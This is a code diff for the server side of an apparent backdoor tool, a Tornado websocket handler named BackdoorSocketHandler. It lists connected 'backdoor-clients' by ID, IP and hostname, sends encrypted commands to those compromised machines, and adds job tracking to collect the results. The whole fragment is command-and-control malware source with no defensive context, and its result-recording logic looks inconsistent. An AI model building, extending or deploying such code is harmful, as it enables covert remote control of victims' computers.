@@ -60,7 +60,14 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                 if command == 'list':
                     data = 'List all online backdoor-clients:\n'
                     for key, client in self.clients.items():
-                        data += str(key) + '\t' + client.UUID + '\t' + self.request.remote_ip + '\t' + self.HOST_NAME + '\n'
+                        data += str(key) + '\t' + client.UUID + '\t' + \
+                                self.request.remote_ip + '\t' + self.HOST_NAME + '\n'
+                    self.send_data(data)
+
+                elif command == 'jobs':
+                    data = 'List all jobs:\n\n'
+                    for job in self.jobs:
+                        data += job[0] + '\nResult:\n' + job[1] + '\n\n'
                     self.send_data(data)
 
                 elif 'to' in msg:
@@ -71,8 +78,9 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                         if not to_client.is_controller:
                             msg['jobid'] = str(len(self.jobs))
                             msg['from'] = self.ID
-                            to_client.write_message(to_client.encrypt(json.dumps(msg)))
-                            self.jobs.append(msg)
+                            msg_json = json.dumps(msg)
+                            to_client.write_message(to_client.encrypt(msg_json))
+                            self.jobs.append([msg_json, 'Running'])
                             self.send_data('OK.\n')
 
                         else:
@@ -80,6 +88,14 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
 
                     else:
                         self.send_data('Not available target.\n')
+
+            elif 'jobid' in msg:
+                to = int(msg['to'])
+                jobid = int(msg['jobid'])
+                if to in self.clients:
+                    to_client = self.clients[to]
+                    to_client.jobs[jobid][1] = msg['rlt']
+                pass
 
         else:
             # --Login--
